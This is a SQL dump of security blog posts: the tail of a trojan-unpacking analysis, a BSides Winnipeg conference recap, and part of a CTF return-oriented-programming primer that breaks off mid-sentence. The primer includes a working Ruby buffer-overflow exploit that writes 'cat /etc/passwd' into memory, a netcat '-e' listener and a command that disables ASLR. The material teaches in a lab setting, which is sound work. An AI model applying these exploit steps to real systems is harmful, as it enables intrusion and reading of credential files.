sub_10001C2E(HMODULE hModule, int)\r\n.text:10001C2E sub_10001C2E proc near ; CODE XREF: do_stuff+12p\r\n.text:10001C2E\r\n.text:10001C2E hModule = dword ptr 8\r\n.text:10001C2E arg_4 = dword ptr 0Ch\r\n.text:10001C2E\r\n.text:10001C2E push ebp\r\n.text:10001C2F mov ebp, esp\r\n.text:10001C31 push esi\r\n.text:10001C32 push 0Ah ; lpType\r\n.text:10001C34 push 65h ; lpName\r\n.text:10001C36 push [ebp+hModule] ; hModule\r\n.text:10001C39 call ds:FindResourceA\r\n.text:10001C3F mov esi, eax\r\n.text:10001C41 test esi, esi\r\n.text:10001C43 jz short loc_10001C9E\r\n.text:10001C45 push edi\r\n.text:10001C46 push esi ; hResInfo\r\n.text:10001C47 push [ebp+hModule] ; hModule\r\n.text:10001C4A call ds:SizeofResource\r\n.text:10001C50 mov edi, eax\r\n.text:10001C52 test edi, edi\r\n.text:10001C54 jz short loc_10001C9D\r\n.text:10001C56 push ebx\r\n.text:10001C57 push esi ; hResInfo\r\n.text:10001C58 push [ebp+hModule] ; hModule\r\n.text:10001C5B call ds:LoadResource\r\n.text:10001C61 mov ebx, eax\r\n.text:10001C63 test ebx, ebx\r\n.text:10001C65 jz short loc_10001C9C\r\n.text:10001C67 push ebx ; hResData\r\n.text:10001C68 call ds:LockResource\r\n.text:10001C6E mov esi, eax\r\n.text:10001C70 test esi, esi\r\n.text:10001C72 jnz short loc_10001C78\r\n\nNote the calls—FindResourceA(), SizeofResource(), LoadResource(), and LockResource(). If you\'re interested in what these are doing exactly, you can find plenty of info in MSDN. But suffice to say, it loads a resource from the PE, identified by the value passed into FindResourceA()—resource 0x65 (101). If you load a resource viewer—such as PEExplorer, you can view the resource section and dump resource 0x65 into a file. That file looks like:\n\r\n$ xxd -g1 stage4_compressed.bin | head\r\n0000000: 41 50 33 32 18 00 00 00 a1 c9 01 00 0b e4 d7 66 AP32...........f\r\n0000010: 0b 51 03 00 f2 8d 91 b3 0b 38 51 03 1c 49 01 38 .Q.......8Q..I.8\r\n0000020: 37 b7 0e 0f 8c 07 09 7b d0 1a 01 be bc 55 1c 8b 7......{.....U..\r\n[...]\r\n\nThe file starts with AP32, and earlier we saw a compression library called \"aPLib\" referenced. Compressed payload anyone?\nAs of the writing, you can download the official AP32 sample application here. You can unpack it with the appack.exe utility:\n\r\n$ ./appack.exe d ./stage4_compressed.bin stage4.bin\r\n===============================================================================\r\naPLib example Copyright (c) 1998-2009 by Joergen Ibsen / Jibz\r\n                                                            All Rights Reserved\r\n\r\n                                                  http://www.ibsensoftware.com/\r\n===============================================================================\r\n\r\ndecompressed 117177 -> 217355 bytes in 0.00 seconds\r\n\n(That tool is super buggy, you might have to move directories and stuff to get it to work; it\'s just a sample, after all)\nDecompressed... now what?\nOnce decompressed, it looks like:\n\r\n0000000: 0b 51 03 00 49 01 00 00 b7 03 00 00 0b 07 00 00 .Q..I...........\r\n0000010: 0b 7b 01 00 00 00 00 00 00 00 00 00 00 00 00 00 .{..............\r\n0000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n0000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r\n[...]\r\n\nHmm.. it\'s clearly not compressed/encrypted, but it doesn\'t look like anything special.\nIf you scroll around, you\'ll quickly find a PE header. If you scroll down a lot more, you\'ll find another PE header. After looking at the numbers in the first 20 bytes, that they are offsets into the file as well as lengths. Those offsets represent PE files! Note that I haven\'t even *started* reversing the code that processes this—and I never did—I simply determined all this by simple guessing and checking.\nHere are the first few int32 values (note: little endian), and what they seem to mean:\n\n0x0003510b - the length of the entire file\n0x00000149 - at this offset, there\'s some raw code—55 8b ... (a raw binary function)—I initially assumed a 16-bit version, but that doesn\'t seem likely\n0x000003b7 - at this offset, nothing special, but it appears to be code. Not sure what its deal is...\n0x0000070b - A proper PE file, that we\'re gonna call \"stage4.bin\"\n0x00017b0b - Another PE file—I guessed that this is a 64-bit version of the same thing, which seems likely—upon inspection, it has the same imports/strings\n0x00000000\n\nI called the file at 0x70b the actual payload. There are also some loader functions and a 64-bit payload that I\'m going to ignore.\nOdds and ends of stage3\nIf you want to know more about stage3, keep reading! This section is very light—the code is complex, and doesn\'t really add much, so I\'m going to give a quick high-level overview of it.\nIt actually creates a .dll file whose name is based on the harddrive serial number and an implementation of a standard pseudo-random number generator. This means that, if installed on the same machine, the .dll will have the same name.\nIt injects the .dll file into every running process, by the looks of it.\nIt puts a lot of effort into determining whether to use the 64- or 32-bit version for each running executable (including correctly detecting the use of Wow64).\nOnce again, because of the cleanness and the fact that it handles 32- and 64-bit systems, as well as Wow64 processes, appropriately, I feel like this was written by somebody who clearly knows what they are doing.\nConclusion\nOnce you extract the 32-bit .dll file from the de-compressed data, you now have what I called stage4.bin. This is the final stage, and does the actual malicious functionality. As I said initially, I haven\'t reversed it. But if you look at it in IDA, you\'ll see a ton of command-and-control-like functionality. It contacts servers over HTTPS, it modifies Web sites, and lots more interesting stuff.\nWhen I have more time, I\'ll look at it in more detail!\nHope you enjoyed this!', '\'Malware\', \'Reverse Engineering\'', 'https://blog.skullsecurity.org/2014/in-depth-malware-unpacking-the-lcmw-trojan');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (33, 'BSides Winnipeg Wrap-up', 'Ron Bowes', '2013-12-10', 'For those of you who are close to me, you\'ll know that my life has been crazy lately. Between teaching courses, changing jobs (here I come, Google!recently started at Google! (I\'m slow at posting these :) )), and organizing BSides Winnipeg, I\'ve barely had time to breathe!\nThings are still chaotic, of course (in fact, movers were packing up my life as I wrote this), but I wanted to take some time and talk about BSides Winnipeg.\nI\'ll go over the background, the planning, the day-of, and some lessons learned. If you just want to see cool photos, here you go!\n\nBackground\nI think BSides Winnipeg is best summed up by this complaint (from one of the most negative surveys we received):\nQ: \"What, if anything, sticks out as something you particularly *disliked* about the conference?\"\nA: \"The content was very technical, and did not seem to follow any specific underlying theme aside from security. This is the only personal time I have for errands, so was not able to stay for all of the sessions.\"\nFor a weekend security conference, if our biggest mistake is having a security conference on the weekend, I think we win!\nSo, the idea of having a security conference has been something that me and Mak Kolybabi have talked about forever. I\'ve known Mak for way, way too long. I marked his papers in University, he was an intern when I worked in government, and we beat almost all of Notpron together. That\'s true friendship right there!\nAnyway, me, Mak, and Andrew Orr founded SkullSpace, Winnipeg\'s first and only hackerspace, three years ago (in fact, our first ever meeting was December 7, 2010—almost exactly three years ago). We had many objectives back then—bring together the community, give Winnipeg\'s tech-savvy at-risk youth a place to hang out, and to get the coolest foosball table we could find. But one of our most important objectives was to bring a conference to Winnipeg.\nWe spent a lot of time discussing how we would do that. My favourite idea that never left the drawing board was to host the conference in October, when DST turned off. That way, we would have a 25-hour day on Sunday, and could officially all ourselves the \"longest one-day conference\". That didn\'t happen for what I hope are obvious reasons. (It probably wasn\'t our worst idea.) [Editor\'s Note: I actually registered timecon.ca because I felt that this idea was so terrible that we had to do it.]\nAfter months of discussion, we settled on doing a BSides conference, and registered BSides Winnipeg as a not-for-profit corporation in Manitoba. We invited anybody who wanted to help out to come to our first meeting, and then tricked them into signing paperwork, making them legally responsible. Before we knew it, we had six directors (who probably just realized they\'re legally responsible from reading this); besides myself, we had (in alphabetical order): Alex Weber, Andrew Orr, Colin Childs, Jay Smith, and Mak Kolybabi. Why us? We were at the first meeting. And, we all made it happen!\nPlanning\nThere were a lot of questions to answer in the planning phase. How long? What time? Where do we host it? Etc. etc.\nDue to a mistake in geography, I attended (and spoke at!) BSides Ottawa a couple years earlier, which was hosted, if my memory serves, at a bar called Tucsons in Ottawa, ON. It was a two-day one-track conference held at a bar. I loved that idea, and I really pushed for it. We were uncertain if we could afford a two-day con, so I made it my goal to get enough sponsors to make that work.\nSponsors\nI spent a lot of pounding the pavement, and contacting sponsors. Seccuris was super receptive, as the biggest supporter of infosec in Winnipeg. They quickly became our highest-tier sponsor, followed by many others. A number of small Winnipeg-based companies sponsored it, such as Octopi Managed Services, and I was also able to find a receptive group at Microsoft who eventually (to my huge surprise!) cut us a cheque. Tenable—as the employer of half our organizers—also helped out, as well as PacketViper at the last minute.\nMy favourite story from getting sponsorship was this: I emailed a large Winnipeg-based tech company asking for sponsorship money (as I frequently do). They quickly responded with a polite decline, saying \"we aren\'t inclined to sponsor these type of events\". I appreciated the response—I much prefer a polite decline to being ignored. I thanked them for their time and moved on. A couple days later, an employee of the company emailed me and offered to personally sponsor the conference. Before I knew it, he\'d written us a cheque! That was super cool, and we likely would have given up on either t-shirts or badges without him!\nOur complete list of sponsors can be found on our sponsorship page. Please support them, and let them know that you appreciate their sponsorship!\nAnother important question was: do we get sponsors to pay directly for goods, or do we open our own bank account and take/write cheques. It quickly became apparent that having our own bank account was the easiest solution, and that\'s the path we chose. Sponsors paid us, and we paid out the goods.\nVenue\nAfter BSides Ottawa at Tucson\'s, I really wanted something with that kind of atmosphere. As the official meeting space for SkullSpace (before we had our own), the King\'s Head was the obvious choice. I emailed the owner of the King\'s Head on August 17, 2012, asking if we could book space for a weekend of November in 2013. I\'m not usually one to plan ahead, but we had space booked like fourteen months in advance!\nThe King\'s Head was a fantastic venue. They let us use their space for free, as long as they catered the food. We wound up giving them a budget to work within, as well as a headcount, and they took care of the rest. We got fantastic feedback on the venue, with the only complaint being that it was too crowded.\nOne lesson learned: we didn\'t get the invoice from the King\'s Head till after the event, and we had totally neglected to plan for the gratuity they included. Part of that wound up coming out of our pockets, so lesson learned: get the invoice in advance!\nMak\'s Baby\nWe knew Mak was planning to have a baby. As of writing this, she was all but born. Once we had the dates picked out, Mak found this gem in our chat history:\n[2012-08-17 09:06:10] ( xorrbit) mak can get katie preggers now and have a bsides baby\nThe best part was, with Katie\'s due date being the week after BSides, that was a contingency we had to plan for all weekend! Mak could, at any point, get the \"it\'s time\" phonecall. Fortunately, he didn\'t. The baby has now been born, on December 2/2013, and is home and healthy!\nBadges\nWe had high hopes of doing electronic badges, and even had a small local company—Retrohm—lined up to do them. Unfortunately, we couldn\'t afford to do anything fancy, but here\'s an early prototype:\n\nPrototyping something special iteration 2 (the right year this time!) pic.twitter.com/vEiO3jnr\n— Andrew Orr (@xorrbit) September 26, 2012\n\nWe also had all kinds of crazy ideas, such as, \"Would it be doable to have a badge that fills up a QR code the more ppl you\'ve met?\"\nMaybe next year? :)\nWe ended up some some pretty slick looking badges anyway!\nRecording\nWe knew we wanted the talks recorded and streamed, but also that we didn\'t know how to do it ourselves. Fortunately, we got some help from Rylaan Gimby and Ric Lim, who were recruited by Colin Childs. On the day-of, Thor Robinson was also recruited to help out.\nWith equipment obtained from Video Pool, they did a fantastic job recording the talks! The videos aren\'t online as of this writing, but I\'ll be sure to send out links when they are.\nAs many of you know, we also had a live stream. On day one, it wasn\'t set up as well as it could have been, but we caught all the action on day two. Lesson learned: stream the projector, not the speaker (with a webcam, you can\'t really do both).\nThe A/V crew also took care of the sound board, which was a huge help! Having a good A/V crew made the whole event run far more smoothly than it would have, so I\'m super glad that we got the right folks together!\nInternet\nThe Internet connection was sponsored by VOI Network Solutions, a small Winnipeg-based ISP. We put a point-to-point dish on the roof that gave us a fantastic 30mbit connection. My understanding is that they plan to keep it at the King\'s Head, too, so that\'s a definite win-win.\nHaving these various non-monetary sponsors—King\'s Head, Video Pool, VOI Network Solutions—was a huge benefit. We didn\'t get money from it, but we got free use of the venue, free recording equipment, and free Internet access!\nDay of\nThe morning of, we arrived at 11:00am and started setting up chairs. By 11:30, it looked like a conference. About that time, people started arriving. By the time the first talk kicked off, we had nearly a full room!\n(A funny sidenote: somebody mentioned that we should bring lots of duct tape, just in case, so I threw a roll of duct tape in my bag. Within the first ten minutes, somebody was asking if anybody brought tape. Win!)\nRegistration went smoothly, the talks were fantastic, the Internet connection worked, the food was good and right on time, and the bartender—Dave—is the greatest person in the world. All in all, we had a blast! No major issues arose!\nThat being said, I spent the whole day walking from stage to wireless village to registration to the audio both and back to the stage, making sure everything was going well. I don\'t think I was ever needed, beyond simple decisions, so that was awesome!\nSaturday night, we cleaned up, enjoyed the evening, and set up again first thing Sunday.\nSunday morning, we woke up to snow. The first snowfall of the season! Classic Winnipeg. One of our speakers, Brandon Enright—who was visiting from California—wondered when the rescue helicopters were showing up, though any Winnipeggers know that a couple inches of snow on the ground is probably nothing to call the National Guard about. :)\nThe whole day Sunday went even more smoothly! I spent most of the day watching talks and relaxing a bit. Then the Sunday cleanup went well, and we all made it home.\nResult\nSo, what was the result?\nWe had about 160 tickets total—including sponsors, speakers, staff, and attendees. We had about 140 people show up.\nWe used 101 drink tickets on the first day, I didn\'t get a count for the second day (but it was less than 30, if we went over 130 we would have heard about it, since that\'s all we paid for).\nEvery talk happened, and they almost always started right on time. The feedback was universally positive. So we definitely did something right! One tiny mistake: we didn\'t leave room for meals, so the talks surrounding the meals had to be coaxed into place to make room. Lesson learned!\nWe sent out surveys to everyone, and they mostly came back positive. Somewhere in the realm of 95% were either mostly or very satisfied, and only I think 2% were in any way dissatisfied (nobody said \"very dissatisfied\").\nFuture\nAfter a great conference, we\'re excited to do BSides Winnipeg 2014! We\'ve deferred all planning until January, to give us time to relax. Our goal is to grow into a bigger venue, assuming we can find the sponsorship we need. So here\'s hoping!\nLessons learned\nSome things went well and some things went less than well:\n\nWe need breaks for lunch and/or dinner, and between talks\nGet invoices in advance—the gratuity surprised us\nHave three or four people whose specific (and only) job is audio/video gear (recording, streaming, sound board)\nBring a roll of duct tape\n\nSo once again, thanks to everybody who made this happen!', '\'Conferences\'', 'https://blog.skullsecurity.org/2013/bsides-winnipeg-wrap-up');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (34, 'ropasaurusrex: a primer on return-oriented programming', 'Ron Bowes', '2013-5-2', 'One of the worst feelings when playing a capture-the-flag challenge is the hindsight problem. You spend a few hours on a level—nothing like the amount of time I spent on cnot, not by a fraction—and realize that it was actually pretty easy. But also a brainfuck. That\'s what ROP\'s all about, after all!\nAnyway, even though I spent a lot of time working on the wrong solution (specifically, I didn\'t think to bypass ASLR for quite awhile), the process we took of completing the level first without, then with ASLR, is actually a good way to show it, so I\'ll take the same route on this post.\nBefore I say anything else, I have to thank HikingPete for being my wingman on this one. Thanks to him, we solved this puzzle much more quickly and, for a short time, were in 3rd place worldwide!\n\nCoincidentally, I\'ve been meaning to write a post on ROP for some time now. I even wrote a vulnerable demo program that I was going to base this on! But, since PlaidCTF gave us this challenge, I thought I\'d talk about it instead! This isn\'t just a writeup, this is designed to be a fairly in-depth primer on return-oriented programming! If you\'re more interested in the process of solving a CTF level, have a look at my writeup of cnot. :)\nWhat the heck is ROP?\nROP—return-oriented programming—is a modern name for a classic exploit called \"return into libc\". The idea is that you found an overflow or other type of vulnerability in a program that lets you take control, but you have no reliable way get your code into executable memory (DEP, or data execution prevention, means that you can\'t run code from anywhere you want anymore).\nWith ROP, you can pick and choose pieces of code that are already in sections executable memory and followed by a \'return\'. Sometimes those pieces are simple, and sometimes they\'re complicated. In this exercise, we only need the simple stuff, thankfully!\nBut, we\'re getting ahead of ourselves. Let\'s first learn a little more about the stack! I\'m not going to spend a ton of time explaining the stack, so if this is unclear, please check out my assembly tutorial.\nThe stack\nI\'m sure you\'ve heard of the stack before. Stack overflows? Smashing the stack? But what\'s it actually mean? If you already know, feel free to treat this as a quick primer, or to just skip right to the next section. Up to you!\nThe simple idea is, let\'s say function A() calls function B() with two parameters, 1 and 2. Then B() calls C() with two parameters, 3 and 4. When you\'re in C(), the stack looks like this:\n\r\n+----------------------+\r\n|         ...          | (higher addresses)\r\n+----------------------+\r\n\r\n+----------------------+ <-- start of \'A\'s stack frame\r\n|   [return address]   | <-- address of whatever called \'A\'\r\n+----------------------+\r\n|   [frame pointer]    |\r\n+----------------------+\r\n|   [local variables]  |\r\n+----------------------+\r\n\r\n+----------------------+ <-- start of \'B\'s stack frame\r\n|         2 (parameter)|\r\n+----------------------+\r\n|         1 (parameter)|\r\n+----------------------+\r\n|   [return address]   | <-- the address that \'B\' returns to\r\n+----------------------+\r\n|   [frame pointer]    |\r\n+----------------------+\r\n|   [local variables]  | \r\n+----------------------+\r\n\r\n+----------------------+ <-- start of \'C\'s stack frame\r\n|         4 (parameter)|\r\n+----------------------+\r\n|         3 (parameter)|\r\n+----------------------+\r\n|   [return address]   | <-- the address that \'C\' returns to\r\n+----------------------+\r\n\r\n+----------------------+\r\n|         ...          | (lower addresses)\r\n+----------------------+\r\n\nThis is quite a mouthful (eyeful?) if you don\'t live and breathe all the time at this depth, so let me explain a bit. Every time you call a function, a new \"stack frame\" is built. A \"frame\" is simply some memory that the function allocates for itself on the stack. In fact, it doesn\'t even allocate it, it just adds stuff to the end and updates the esp register so any functions it calls know where its own stack frame needs to start (esp, the stack pointer, is basically a variable).\nThis stack frame holds the context for the current function, and lets you easily a) build frames for new functions being called, and b) return to previous frames (i.e., return from functions). esp (the stack pointer) moves up and down, but always points to the top of the stack (the lowest address).\nHave you ever wondered where a function\'s local variables go when you call another function (or, better yet, you call the same function again recursively)? Of course not! But if you did, now you\'d know: they wind up in an old stack frame that we return to later!\nNow, let\'s look at what\'s stored on the stack, in the order it gets pushed (note that, confusingly, you can draw a stack either way; in this document, the stack grows from top to bottom, so the older/callers are on top and the newer/callees are on the bottom):\n\nParameters: The parameters that were passed into the function by the caller—these are extremely important with ROP.\nReturn address: Every function needs to know where to go when it\'s done. When you call a function, the address of the instruction right after the call is pushed onto the stack prior to entering the new function. When you return, the address is popped off the stack and is jumped to. This is extremely important with ROP.\nSaved frame pointer: Let\'s totally ignore this. Seriously. It\'s just something that compilers typically do, except when they don\'t, and we won\'t speak of it again.\nLocal variables: A function can allocate as much memory as it needs (within reason) to store local variables. They go here. They don\'t matter at all for ROP and can be safely ignored.\n\nSo, to summarize: when a function is called, parameters are pushed onto the stack, followed by the return address. When the function returns, it grabs the return address off the stack and jumps to it. The parameters pushed onto the stack are removed by the calling function, except when they\'re not. We\'re going to assume the caller cleans up, that is, the function doesn\'t clean up after itself, since that\'s is how it works in this challenge (and most of the time on Linux).\nHeaven, hell, and stack frames\nThe main thing you have to understand to know ROP is this: a function\'s entire universe is its stack frame. The stack is its god, the parameters are its commandments, local variables are its sins, the saved frame pointer is its bible, and the return address is its heaven (okay, probably hell). It\'s all right there in the Book of Intel, chapter 3, verses 19 - 26 (note: it isn\'t actually, don\'t bother looking).\nLet\'s say you call the sleep() function, and get to the first line; its stack frame is going to look like this:\n\r\n          ...            <-- don\'t know, don\'t care territory (higher addresses)\r\n+----------------------+\r\n|      [seconds]       |\r\n+----------------------+\r\n|   [return address]   | <-- esp points here\r\n+----------------------+\r\n          ...            <-- not allocated, don\'t care territory (lower addresses)\r\n\nWhen sleep() starts, this stack frame is all it sees. It can save a frame pointer (crap, I mentioned it twice since I promised not to; I swear I won\'t mention it again) and make room for local variables by subtracting the number of bytes it wants from esp (ie, making esp point to a lower address). It can call other functions, which create new frames under esp. It can do many different things; what matters is that, when it sleep() starts, the stack frame makes up its entire world.\nWhen sleep() returns, it winds up looking like this:\n\r\n          ...            <-- don\'t know, don\'t care territory (higher addresses)\r\n+----------------------+\r\n|      [seconds]       | <-- esp points here\r\n+----------------------+\r\n| [old return address] | <-- not allocated, don\'t care territory starts here now\r\n+----------------------+\r\n          ...            (lower addresses)\r\n\nAnd, of course, the caller, after sleep() returns, will remove \"seconds\" from the stack by adding 4 to esp (later on, we\'ll talk about how we have to use pop/pop/ret constructs to do the same thing).\nIn a properly working system, this is how life works. That\'s a safe assumption. The \"seconds\" value would only be on the stack if it was pushed, and the return address is going to point to the place it was called from. Duh. How else would it get there?\nControlling the stack\n...well, since you asked, let me tell you. We\'ve all heard of a \"stack overflow\", which involves overwriting a variable on the stack. What\'s that mean? Well, let\'s say we have a frame that looks like this:\n\r\n          ...            <-- don\'t know, don\'t care territory (higher addresses)\r\n+----------------------+\r\n|      [seconds]       |\r\n+----------------------+\r\n|   [return address]   | <-- esp points here\r\n+----------------------+\r\n|     char buf[16]     |\r\n|                      |\r\n|                      |\r\n|                      |\r\n+----------------------+\r\n          ...            (lower addresses)\r\n\nThe variable buf is 16 bytes long. What happens if a program tries to write to the 17th byte of buf (i.e., buf[16])? Well, it writes to the last byte—little endian—of the return address. The 18th byte writes to the second-last byte of the return address, and so on. Therefore, we can change the return address to point to anywhere we want. Anywhere we want. So when the function returns, where\'s it go? Well, it thinks it\'s going to where it\'s supposed to go—in a perfect world, it would be—but nope! In this case, it\'s going to wherever the attacker wants it to. If the attacker says to jump to 0, it jumps to 0 and crashes. If the attacker says to go to 0x41414141 (\"AAAA\"), it jumps there and probably crashes. If the attacker says to jump to the stack... well, that\'s where it gets more complicated...\nDEP\nTraditionally, an attacker would change the return address to point to the stack, since the attacker already has the ability to put code on the stack (after all, code is just a bunch of bytes!). But, being that it was such a common and easy way to exploit systems, those assholes at OS companies (just kidding, I love you guys :) ) put a stop to it by introducing data execution prevention, or DEP. On any DEP-enabled system, you can no longer run code on the stack—or, more generally, anywhere an attacker can write—instead, it crashes.\nSo how the hell do I run code without being allowed to run code!?\nWell, we\'re going to get to that. But first, let\'s look at the vulnerability that the challenge uses!\nThe vulnerability\nHere\'s the vulnerable function, fresh from IDA:\n\r\n 1   .text:080483F4vulnerable_function proc near\r\n 2   .text:080483F4\r\n 3   .text:080483F4buf             = byte ptr -88h\r\n 4   .text:080483F4\r\n 5   .text:080483F4         push    ebp\r\n 6   .text:080483F5         mov     ebp, esp\r\n 7   .text:080483F7         sub     esp, 98h\r\n 8   .text:080483FD         mov     dword ptr [esp+8], 100h ; nbytes\r\n 9   .text:08048405         lea     eax, [ebp+buf]\r\n10   .text:0804840B         mov     [esp+4], eax    ; buf\r\n11   .text:0804840F         mov     dword ptr [esp], 0 ; fd\r\n12   .text:08048416         call    _read\r\n13   .text:0804841B         leave\r\n14   .text:0804841C         retn\r\n15   .text:0804841Cvulnerable_function endp\r\n\nNow, if you don\'t know assembly, this might look daunting. But, in fact, it\'s simple. Here\'s the equivalent C:\n\r\n1   ssize_t __cdecl vulnerable_function()\r\n2   {\r\n3     char buf[136];\r\n4     return read(0, buf, 256);\r\n5   }\r\n\nSo, it reads 256 bytes into a 136-byte buffer. Goodbye Mr. Stack!\nYou can easily validate that by running it, piping in a bunch of \'A\'s, and seeing what happens:\n\r\n1   ron@debian-x86 ~ $ ulimit -c unlimited\r\n2   ron@debian-x86 ~ $ perl -e \"print \'A\'x300\" | ./ropasaurusrex\r\n3   Segmentation fault (core dumped)\r\n4   ron@debian-x86 ~ $ gdb ./ropasaurusrex core\r\n5   [...]\r\n6   Program terminated with signal 11, Segmentation fault.\r\n7   #0  0x41414141 in ?? ()\r\n8   (gdb)\r\n\nSimply speaking, it means that we overwrote the return address with the letter A 4 times (0x41414141 = \"AAAA\").\nNow, there are good ways and bad ways to figure out exactly what you control. I used a bad way. I put \"BBBB\" at the end of my buffer and simply removed \'A\'s until it crashed at 0x42424242 (\"BBBB\"):\n\r\n1   ron@debian-x86 ~ $ perl -e \"print \'A\'x140;print \'BBBB\'\" | ./ropasaurusrex\r\n2   Segmentation fault (core dumped)\r\n3   ron@debian-x86 ~ $ gdb ./ropasaurusrex core\r\n4   #0  0x42424242 in ?? ()\r\n\nIf you want to do this \"better\" (by which I mean, slower), check out Metasploit\'s pattern_create.rb and pattern_offset.rb. They\'re great when guessing is a slow process, but for the purpose of this challenge it was so quick to guess and check that I didn\'t bother.\nStarting to write an exploit\nThe first thing you should do is start running ropasaurusrex as a network service. The folks who wrote the CTF used xinetd to do this, but we\'re going to use netcat, which is just as good (for our purposes):\n\r\n1 $ while true; do nc -vv -l -p 4444 -e ./ropasaurusrex; done\r\n2 listening on [any] 4444 ...\r\n\nFrom now on, we can use localhost:4444 as the target for our exploit and test if it\'ll work against the actual server.\nYou may also want to disable ASLR if you\'re following along:\n\r\n1 $ sudo sysctl -w kernel.randomize_va_space=0\r\n\nNote that this will make your system easier to exploit, so I don\'t recommend doing this outside of a lab environment!\nHere\'s some ruby code for the initial exploit:\n\r\n 1 require \'socket\'\r\n 2 \r\n 3 $ cat ./sploit.rb\r\n 4 s = TCPSocket.new(\"localhost\", 4444)\r\n 5 \r\n 6 # Generate the payload\r\n 7 payload = \"A\"*140 +\r\n 8   [\r\n 9     0x42424242,\r\n10   ].pack(\"I*\") # Convert a series of \'ints\' to a string\r\n11 \r\n12 s.write(payload)\r\n13 s.close()\r\n\nRun that with ruby ./sploit.rb and you should see the service crash:\n\r\n1 connect to [127.0.0.1] from debian-x86.skullseclabs.org [127.0.0.1] 53451\r\n2 Segmentation fault (core dumped)\r\n\nAnd you can verify, using gdb, that it crashed at the right location:\n\r\n1 gdb --quiet ./ropasaurusrex core\r\n2 [...]\r\n3 Program terminated with signal 11, Segmentation fault.\r\n4 #0  0x42424242 in ?? ()\r\n\nWe now have the beginning of an exploit!\nHow to waste time with ASLR\nI called this section \'wasting time\', because I didn\'t realize—at the time—that ASLR was enabled. However, assuming no ASLR actually makes this a much more instructive puzzle. So for now, let\'s not worry about ASLR—in fact, let\'s not even define ASLR. That\'ll come up in the next section.\nOkay, so what do we want to do? We have a vulnerable process, and we have the libc shared library. What\'s the next step?\nWell, our ultimate goal is to run system commands. Because stdin and stdout are both hooked up to the socket, if we could run, for example, system(\"cat /etc/passwd\"), we\'d be set! Once we do that, we can run any command. But doing that involves two things:\n\nGetting the string cat /etc/passwd into memory somewhere\nRunning the system() function\n\nGetting the string into memory\nGetting the string into memory actually involves two sub-steps:\n\nFind some memory that we can write to\nFind a function that can write to it\n\nTall order? Not really! First things first, let\'s find some memory that we can read and write! The most obvious place is the .data section:\n\r\n1 ron@debian-x86 ~ $ objdump -x ropasaurusrex  | grep -A1 \'\\.data\'\r\n2  23 .data         00000008  08049620  08049620  00000620  2**2\r\n3                    CONTENTS, ALLOC, LOAD, DATA\r\n4 \r\n\nUh oh, .data is only 8 bytes long. That\'s not enough! In theory, any address that\'s long enough, writable, and not used will be enough for what we need. Looking at the output for objdump -x, I see a section called .dynamic that seems to fit the bill:\n\r\n1 \r\n2  20 .dynamic      000000d0  08049530  08049530  00000530  2**2\r\n3                    CONTENTS, ALLOC, LOAD, DATA\r\n\nThe .dynamic section holds information for dynamic linking. We don\'t need that for what we\'re going to do, so let\'s choose address 0x08049530 to overwrite.\nThe next step is to find a function that can write our command string to address 0x08049530. The most convenient functions to use are the ones that are in the executable itself, rather than a library, since the functions in the executable won\'t change from system to system. Let\'s look at what we have:\n\r\n 1 ron@debian-x86 ~ $ objdump -R ropasaurusrex\r\n 2 \r\n 3 ropasaurusrex:     file format elf32-i386\r\n 4 \r\n 5 DYNAMIC RELOCATION RECORDS\r\n 6 OFFSET   TYPE              VALUE\r\n 7 08049600 R_386_GLOB_DAT    __gmon_start__\r\n 8 08049610 R_386_JUMP_SLOT   __gmon_start__\r\n 9 08049614 R_386_JUMP_SLOT   write\r\n10 08049618 R_386_JUMP_SLOT   __libc_start_main\r\n11 0804961c R_386_JUMP_SLOT   read\r\n\nSo, we have read() and write() immediately available. That\'s helpful! The read() function will read data from the socket and write it to memory. The prototype looks like this:\n\r\n1 ssize_t read(int fd, void *buf, size_t count);\r\n\nThis means that, when you enter the read() function, you want the stack to look like this:\n\r\n+----------------------+\r\n|         ...          | - doesn\'t matter, other funcs will go here\r\n+----------------------+\r\n\r\n+----------------------+ <-- start of read()\'s stack frame\r\n|     size_t count     | - count, strlen(\"cat /etc/passwd\")\r\n+----------------------+\r\n|      void *buf       | - writable memory, 0x08049530\r\n+----------------------+\r\n|        int fd        | - should be \'stdin\' (0)\r\n+----------------------+\r\n|   [return address]   | - where \'read\' will return\r\n+----------------------+\r\n\r\n+----------------------+\r\n|         ...          | - doesn\'t matter, read() will use for locals\r\n+----------------------+\r\n\nWe update our exploit to look like this (explanations are in the comments):\n\r\n 1 $ cat sploit.rb\r\n 2 require \'socket\'\r\n 3 \r\n 4 s = TCPSocket.new(\"localhost\", 4444)\r\n 5 \r\n 6 # The command we\'ll run\r\n 7 cmd = ARGV[0] + \"\\0\"\r\n 8 \r\n 9 # From objdump -x\r\n10 buf = 0x08049530\r\n11 \r\n12 # From objdump -D ./ropasaurusrex | grep read\r\n13 read_addr = 0x0804832C\r\n14 # From objdump -D ./ropasaurusrex | grep write\r\n15 write_addr = 0x0804830C\r\n16 \r\n17 # Generate the payload\r\n18 payload = \"A\"*140 +\r\n19   [\r\n20     cmd.length, # number of bytes\r\n21     buf,        # writable memory\r\n22     0,          # stdin\r\n23     0x43434343, # read\'s return address\r\n24 \r\n25     read_addr # Overwrite the original return\r\n26   ].reverse.pack(\"I*\") # Convert a series of \'ints\' to a string\r\n27 \r\n28 # Write the \'exploit\' payload\r\n29 s.write(payload)\r\n30 \r\n31 # When our payload calls read() the first time, this is read\r\n32 s.write(cmd)\r\n33 \r\n34 # Clean up\r\n35 s.close()\r\n\nWe run that against the target:\n\r\n1 ron@debian-x86 ~ $ ruby sploit.rb \"cat /etc/passwd\"\r\n\nAnd verify that it crashes:\n\r\n1 listening on [any] 4444 ...\r\n2 connect to [127.0.0.1] from debian-x86.skullseclabs.org [127.0.0.1] 53456\r\n3 Segmentation fault (core dumped)\r\n\nThen verify that it crashed at the return address of read() (0x43434343) and wrote the command to the memory at 0x08049530:\n\r\n1 $ gdb --quiet ./ropasaurusrex core\r\n2 [...]\r\n3 Program terminated with signal 11, Segmentation fault.\r\n4 #0  0x43434343 in ?? ()\r\n5 (gdb) x/s 0x08049530\r\n6 0x8049530:       \"cat /etc/passwd\"\r\n\nPerfect!\nRunning it\nNow that we\'ve written cat 